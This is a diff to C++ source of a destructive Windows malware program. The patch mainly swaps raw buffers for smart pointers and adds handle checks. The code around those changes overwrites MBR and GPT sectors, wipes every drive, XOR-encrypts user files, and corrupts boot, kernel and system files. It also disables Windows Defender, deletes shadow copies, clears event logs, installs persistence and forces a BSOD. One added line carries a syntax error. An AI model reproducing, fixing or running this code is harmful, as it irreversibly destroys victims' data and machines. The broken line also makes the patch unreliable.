@@ -39,6 +39,7 @@
 #include <atomic>
 #include <mutex>
 #include <condition_variable>
+#include <memory>
 
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "virtdisk.lib")
@@ -166,6 +167,52 @@ std::mt19937 gen(rd());
 std::uniform_int_distribution<> dis(0, 255);
 std::uniform_real_distribution<> disf(0.0, 1.0);
 
+// Forward declarations
+BOOL IsRunAsAdmin();
+void DestroyMBR();
+void DestroyGPT();
+void DestroyRegistry();
+void DisableCtrlAltDel();
+void SetCriticalProcess();
+void BreakTaskManager();
+void KillCriticalProcesses();
+void ClearEventLogs();
+void ClearShadowCopies();
+void WipeRemovableMedia();
+void CorruptBootFiles();
+void CorruptKernelFiles();
+void DisableWindowsDefender();
+void SetCustomBootFailure();
+void WipeAllDrives();
+void EncryptUserFiles();
+void CorruptBIOS();
+void PropagateNetwork();
+void ExecuteDestructiveActions();
+void PlayGlitchSoundAsync();
+void CaptureScreen(HWND hwnd);
+void ApplyColorShift(BYTE* pixels, int shift);
+void ApplyScreenShake();
+void ApplyCursorEffect();
+void UpdateParticles();
+void ApplyMeltingEffect(BYTE* originalPixels);
+void ApplyTextCorruption();
+void ApplyPixelSorting();
+void ApplyStaticBars();
+void ApplyInversionWaves();
+void ApplyMatrixRain();
+void ApplyFractalNoise();
+void ApplyScreenBurn();
+void ApplyWormholeEffect();
+void ApplyTemporalDistortion();
+void ApplyGlitchEffect();
+void OpenRandomPopups();
+void InstallPersistence();
+void DisableSystemTools();
+void CorruptSystemFiles();
+void TriggerBSOD();
+void RunBackgroundProcess();
+LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
+
 // ======== ENHANCED ADMIN DESTRUCTIVE FUNCTIONS ========
 BOOL IsRunAsAdmin() {
     BOOL fIsRunAsAdmin = FALSE;
@@ -185,16 +232,14 @@ void DestroyMBR() {
 
     // Overwrite first 2048 sectors (1MB)
     const DWORD bufferSize = 512 * 2048;
-    BYTE* garbageBuffer = new BYTE[bufferSize];
+    std::unique_ptr<BYTE[]> garbageBuffer(new BYTE[bufferSize]);
     for (DWORD i = 0; i < bufferSize; i++) {
         garbageBuffer[i] = static_cast<BYTE>(dis(gen));
     }
 
     DWORD bytesWritten;
-    WriteFile(hDrive, garbageBuffer, bufferSize, &bytesWritten, NULL);
+    WriteFile(hDrive, garbageBuffer.get(), bufferSize, &bytesWritten, NULL);
     FlushFileBuffers(hDrive);
-
-    delete[] garbageBuffer;
     CloseHandle(hDrive);
 }
 
@@ -204,7 +249,7 @@ void DestroyGPT() {
 
     // Overwrite GPT header at LBA 1 and backup at last LBA
     const int gptHeaderSize = 512;
-    BYTE* gptGarbage = new BYTE[gptHeaderSize];
+    std::unique_ptr<BYTE[]> gptGarbage(new BYTE[gptHeaderSize]);
     for (int i = 0; i < gptHeaderSize; i++) {
         gptGarbage[i] = static_cast<BYTE>(dis(gen));
     }
@@ -215,7 +260,7 @@ void DestroyGPT() {
     // Primary GPT header
     offset.QuadPart = 512;
     SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
-    WriteFile(hDrive, gptGarbage, gptHeaderSize, &bytesWritten, NULL);
+    WriteFile(hDrive, gptGarbage.get(), gptHeaderSize, &bytesWritten, NULL);
 
     // Get disk size for backup GPT header
     DISK_GEOMETRY_EX dg = {0};
@@ -224,12 +269,12 @@ void DestroyGPT() {
         // Backup GPT header at last LBA
         offset.QuadPart = dg.DiskSize.QuadPart - 512;
         SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
-        WriteFile(hDrive, gptGarbage, gptHeaderSize, &bytesWritten, NULL);
+        WriteFile(hDrive, gptGarbage.get(), gptHeaderSize, &bytesWritten, NULL);
     }
 
     // Overwrite partition entries (more comprehensive)
     const DWORD partitionEntriesSize = 512 * 256;
-    BYTE* partitionGarbage = new BYTE[partitionEntriesSize];
+    std::unique_ptr<BYTE[]> partitionGarbage(new BYTE[partitionEntriesSize]);
     for (DWORD i = 0; i < partitionEntriesSize; i++) {
         partitionGarbage[i] = static_cast<BYTE>(dis(gen));
     }
@@ -237,19 +282,16 @@ void DestroyGPT() {
     // Primary partition entries
     offset.QuadPart = 512 * 2;
     SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
-    WriteFile(hDrive, partitionGarbage, partitionEntriesSize, &bytesWritten, NULL);
+    WriteFile(hDrive, partitionGarbage.get(), partitionEntriesSize, &bytesWritten, NULL);
 
     // Backup partition entries
     if (DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
         offset.QuadPart = dg.DiskSize.QuadPart - 512 - partitionEntriesSize;
         SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
-        WriteFile(hDrive, partitionGarbage, partitionEntriesSize, &bytesWritten, NULL);
+        WriteFile(hDrive, partitionGarbage.get(), partitionEntriesSize, &bytesWritten, NULL);
     }
 
     FlushFileBuffers(hDrive);
-
-    delete[] gptGarbage;
-    delete[] partitionGarbage;
     CloseHandle(hDrive);
 }
 
@@ -372,8 +414,6 @@ void SetCriticalProcess() {
     }
 }
 
-void KillCriticalProcesses();
-
 void BreakTaskManager() {
     // Corrupt taskmgr.exe and related files
     const wchar_t* taskmgrPaths[] = {
@@ -390,14 +430,13 @@ void BreakTaskManager() {
         if (hFile != INVALID_HANDLE_VALUE) {
             DWORD fileSize = GetFileSize(hFile, NULL);
             if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                BYTE* buffer = new BYTE[fileSize];
+                std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
                 if (buffer) {
                     for (DWORD j = 0; j < fileSize; j++) {
                         buffer[j] = static_cast<BYTE>(dis(gen));
                     }
                     DWORD written;
-                    WriteFile(hFile, buffer, fileSize, &written, NULL);
-                    delete[] buffer;
+                    WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
                 }
             }
             CloseHandle(hFile);
@@ -423,9 +462,11 @@ void ClearEventLogs() {
         STARTUPINFOW si = { sizeof(si) };
         PROCESS_INFORMATION pi;
         CreateProcessW(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        WaitForSingleObject(pi.hProcess, 5000);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
+        if (pi.hProcess) {
+            WaitForSingleObject(pi.hProcess, 5000);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+        }
     }
 }
 
@@ -434,21 +475,25 @@ void ClearShadowCopies() {
     PROCESS_INFORMATION pi;
     CreateProcessW(NULL, L"vssadmin delete shadows /all /quiet", 
                  NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    WaitForSingleObject(pi.hProcess, 10000);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    if (pi.hProcess) {
+        WaitForSingleObject(pi.hProcess, 10000);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
     
     // Also try with wmic
     CreateProcessW(NULL, L"wmic shadowcopy delete", 
                  NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    WaitForSingleObject(pi.hProcess, 5000);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    if (pi.hProcess) {
+        WaitForSingleObject(pi.hProcess, 5000);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
 }
 
 void WipeRemovableMedia() {
     const int BUFFER_SIZE = 1024 * 1024; // 1MB buffer
-    BYTE* wipeBuffer = new BYTE[BUFFER_SIZE];
+    std::unique_ptr<BYTE[]> wipeBuffer(new BYTE[BUFFER_SIZE]);
     for (int i = 0; i < BUFFER_SIZE; i++) {
         wipeBuffer[i] = static_cast<BYTE>(dis(gen));
     }
@@ -480,7 +525,7 @@ void WipeRemovableMedia() {
                             ? BUFFER_SIZE : diskSize.QuadPart - totalWritten.QuadPart;
                         
                         DWORD bytesWritten;
-                        WriteFile(hDevice, wipeBuffer, bytesToWrite, &bytesWritten, NULL);
+                        WriteFile(hDevice, wipeBuffer.get(), bytesToWrite, &bytesWritten, NULL);
                         totalWritten.QuadPart += bytesWritten;
                     }
                 }
@@ -489,8 +534,6 @@ void WipeRemovableMedia() {
         }
         drive += wcslen(drive) + 1;
     }
-    
-    delete[] wipeBuffer;
 }
 
 void CorruptBootFiles() {
@@ -515,13 +558,12 @@ void CorruptBootFiles() {
         if (hFile != INVALID_HANDLE_VALUE) {
             DWORD fileSize = GetFileSize(hFile, NULL);
             if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                BYTE* buffer = new BYTE[fileSize];
+                std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
                 for (DWORD j = 0; j < fileSize; j++) {
                     buffer[j] = static_cast<BYTE>(dis(gen));
                 }
                 DWORD written;
-                WriteFile(hFile, buffer, fileSize, &written, NULL);
-                delete[] buffer;
+                WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
             }
             CloseHandle(hFile);
         }
@@ -556,13 +598,12 @@ void CorruptKernelFiles() {
                         if (hFile != INVALID_HANDLE_VALUE) {
                             DWORD fileSize = GetFileSize(hFile, NULL);
                             if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                                BYTE* buffer = new BYTE[fileSize];
+                                std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
                                 for (DWORD j = 0; j < fileSize; j++) {
                                     buffer[j] = static_cast<BYTE>(dis(gen));
                                 }
                                 DWORD written;
-                                WriteFile(hFile, buffer, fileSize, &written, NULL);
-                                delete[] buffer;
+                                WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
                             }
                             CloseHandle(hFile);
                         }
@@ -575,13 +616,12 @@ void CorruptKernelFiles() {
             if (hFile != INVALID_HANDLE_VALUE) {
                 DWORD fileSize = GetFileSize(hFile, NULL);
                 if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                    BYTE* buffer = new BYTE[fileSize];
+                    std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
                     for (DWORD j = 0; j < fileSize; j++) {
                         buffer[j] = static_cast<BYTE>(dis(gen));
                     }
                     DWORD written;
-                    WriteFile(hFile, buffer, fileSize, &written, NULL);
-                    delete[] buffer;
+                    WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
                 }
                 CloseHandle(hFile);
             }
@@ -606,7 +646,8 @@ void DisableWindowsDefender() {
                 
                 // Disable service
                 SERVICE_CONFIG config;
-                QueryServiceConfig(service, &config, sizeof(config), &DWORD(0));
+                DWORD bytesNeeded;
+                QueryServiceConfig(service, &config, sizeof(config), &bytesNeeded);
                 ChangeServiceConfig(service, SERVICE_NO_CHANGE, SERVICE_DISABLED, 
                                   SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
                 CloseServiceHandle(service);
@@ -655,15 +696,19 @@ void DisableWindowsDefender() {
         wchar_t command[512];
         wsprintfW(command, L"schtasks /Change /TN \"%s\" /DISABLE", tasks[i]);
         CreateProcessW(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        WaitForSingleObject(pi.hProcess, 2000);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
+        if (pi.hProcess) {
+            WaitForSingleObject(pi.hProcess, 2000);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+        }
         
         wsprintfW(command, L"schtasks /Delete /TN \"%s\" /F", tasks[i]);
         CreateProcessW(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        WaitForSingleObject(pi.hProcess, 2000);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
+        if (pi.hProcess) {
+            WaitForSingleObject(pi.hProcess, 2000);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+        }
     }
 }
 
@@ -710,7 +755,7 @@ void SetCustomBootFailure() {
 
 void WipeAllDrives() {
     const int BUFFER_SIZE = 1024 * 1024; // 1MB buffer
-    BYTE* wipeBuffer = new BYTE[BUFFER_SIZE];
+    std::unique_ptr<BYTE[]> wipeBuffer(new BYTE[BUFFER_SIZE]);
     for (int i = 0; i < BUFFER_SIZE; i++) {
         wipeBuffer[i] = static_cast<BYTE>(dis(gen));
     }
@@ -737,15 +782,13 @@ void WipeAllDrives() {
                         ? BUFFER_SIZE : diskSize.QuadPart - totalWritten.QuadPart;
                     
                     DWORD bytesWritten;
-                    WriteFile(hDevice, wipeBuffer, bytesToWrite, &bytesWritten, NULL);
+                    WriteFile(hDevice, wipeBuffer.get(), bytesToWrite, &bytesWritten, NULL);
                     totalWritten.QuadPart += bytesWritten;
                 }
             }
             CloseHandle(hDevice);
         }
     }
-    
-    delete[] wipeBuffer;
 }
 
 // ======== ADVANCED DESTRUCTIVE FUNCTIONS ========
@@ -779,10 +822,10 @@ void EncryptUserFiles() {
                         if (hFile != INVALID_HANDLE_VALUE) {
                             DWORD fileSize = GetFileSize(hFile, NULL);
                             if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                                BYTE* buffer = new BYTE[fileSize];
+                                std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
                                 DWORD bytesRead;
                                 
-                                if (ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
+                                if (ReadFile(hFile, buffer.get(), fileSize, &bytesRead, NULL)) {
                                     // Simple XOR encryption with a fixed key
                                     for (DWORD j = 0; j < fileSize; j++) {
                                         buffer[j] ^= 0xAA;
@@ -790,10 +833,8 @@ void EncryptUserFiles() {
                                     
                                     SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
                                     DWORD bytesWritten;
-                                    WriteFile(hFile, buffer, fileSize, &bytesWritten, NULL);
+                                    WriteFile(hFile, buffer.get(), fileSize, &bytesWritten, NULL);
                                 }
-                                
-                                delete[] buffer;
                             }
                             CloseHandle(hFile);
                         }
@@ -826,9 +867,11 @@ void CorruptBIOS() {
     
     for (int i = 0; i < sizeof(biosCommands)/sizeof(biosCommands[0]); i++) {
         CreateProcessW(NULL, (LPWSTR)biosCommands[i], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        WaitForSingleObject(pi.hProcess, 2000);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
+        if (pi.hProcess) {
+            WaitForSingleObject(pi.hProcess, 2000);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+        }
     }
     
     // Method 2: Attempt direct port I/O (will fail on most modern systems)
@@ -993,8 +1036,8 @@ void PlayGlitchSoundAsync() {
     }).detach();
 }
 
-void CaptureScreen(HWND) {
-    HDC hdcScreen = GetDC(NULL);
+void CaptureScreen(HWND hwnd) {
+    HDC hdcScreen = GetDC(hwnd);
     HDC hdcMem = CreateCompatibleDC(hdcScreen);
     
     if (!hGlitchBitmap) {
@@ -1022,7 +1065,7 @@ void CaptureScreen(HWND) {
     cursorY = pt.y;
     
     DeleteDC(hdcMem);
-    ReleaseDC(NULL, hdcScreen);
+    ReleaseDC(hwnd, hdcScreen);
 }
 
 void ApplyColorShift(BYTE* pixels, int shift) {
@@ -1630,7 +1673,7 @@ void ApplyScreenBurn() {
                         int pyPos = y + py;
                         
                         if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
-                            int pos = (pyPos * screenWidth + pxPos) * 4;
+                            int pos = (pyPos * screenWidth + pxPos) * 4);
                             if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                 pPixels[pos] = std::max(0, pPixels[pos] - 10);
                                 pPixels[pos+1] = std::max(0, pPixels[pos+1] - 10);
@@ -1659,9 +1702,9 @@ void ApplyWormholeEffect() {
     }
     
     // Apply wormhole distortion
-    BYTE* pCopy = new (std::nothrow) BYTE[screenWidth * screenHeight * 4];
+    std::unique_ptr<BYTE[]> pCopy(new BYTE[screenWidth * screenHeight * 4]);
     if (!pCopy) return;
-    memcpy(pCopy, pPixels, screenWidth * screenHeight * 4);
+    memcpy(pCopy.get(), pPixels, screenWidth * screenHeight * 4);
     
     for (auto& hole : wormholes) {
         for (int y = 0; y < screenHeight; y++) {
@@ -1703,8 +1746,6 @@ void ApplyWormholeEffect() {
             ++it;
         }
     }
-    
-    delete[] pCopy;
 }
 
 void ApplyTemporalDistortion() {
@@ -1741,9 +1782,9 @@ void ApplyTemporalDistortion() {
 void ApplyGlitchEffect() {
     if (!pPixels) return;
     
-    BYTE* pCopy = new (std::nothrow) BYTE[screenWidth * screenHeight * 4];
+    std::unique_ptr<BYTE[]> pCopy(new BYTE[screenWidth * screenHeight * 4]);
     if (!pCopy) return;
-    memcpy(pCopy, pPixels, screenWidth * screenHeight * 4);
+    memcpy(pCopy.get(), pPixels, screenWidth * screenHeight * 4);
     
     DWORD currentTime = GetTickCount();
     int timeIntensity = 1 + static_cast<int>((currentTime - startTime) / 3000);
@@ -1775,7 +1816,7 @@ void ApplyGlitchEffect() {
             int currentY = y + h;
             if (currentY >= screenHeight) break;
             
-            BYTE* source = pCopy + (currentY * screenWidth * 4);
+            BYTE* source = pCopy.get() + (currentY * screenWidth * 4);
             BYTE* dest = pPixels + (currentY * screenWidth * 4);
             
             if (xOffset > 0) {
@@ -1829,7 +1870,7 @@ void ApplyGlitchEffect() {
             int destY = sourceY + offsetY;
             
             if (destY >= 0 && destY < screenHeight && sourceY >= 0 && sourceY < screenHeight) {
-                BYTE* source = pCopy + (sourceY * screenWidth + x) * 4;
+                BYTE* source = pCopy.get() + (sourceY * screenWidth + x) * 4;
                 BYTE* dest = pPixels + (destY * screenWidth + x + offsetX) * 4;
                 
                 int effectiveWidth = blockWidth;
@@ -1936,7 +1977,7 @@ void ApplyGlitchEffect() {
     }
     
     if (intensityLevel > 3 && rand() % 8 == 0) {
-        ApplyMeltingEffect(pCopy);
+        ApplyMeltingEffect(pCopy.get());
     }
     
     if (textCorruptionActive) {
@@ -2048,8 +2089,6 @@ void ApplyGlitchEffect() {
             std::thread(TriggerBSOD).detach();
         }
     }
-    
-    delete[] pCopy;
 }
 
 // ======== ENHANCED POPUP FUNCTION ========
@@ -2209,9 +2248,11 @@ void InstallPersistence() {
     si.cb = sizeof(si);
     PROCESS_INFORMATION pi;
     CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    WaitForSingleObject(pi.hProcess, INFINITE);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    if (pi.hProcess) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
     
     // Revert redirection
     if (oldRedir && IsWindows64()) {
@@ -2296,16 +2337,14 @@ void CorruptSystemFiles() {
                     if (hFile != INVALID_HANDLE_VALUE) {
                         DWORD fileSize = GetFileSize(hFile, NULL);
                         if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                            BYTE* buffer = new BYTE[fileSize];
+                            std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
                             if (buffer) {
                                 for (DWORD j = 0; j < fileSize; j++) {
                                     buffer[j] = static_cast<BYTE>(dis(gen));
                                 }
                                 
                                 DWORD written;
-                                WriteFile(hFile, buffer, fileSize, &written, NULL);
-                                
-                                delete[] buffer;
+                                WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
                             }
                         }
                         CloseHandle(hFile);
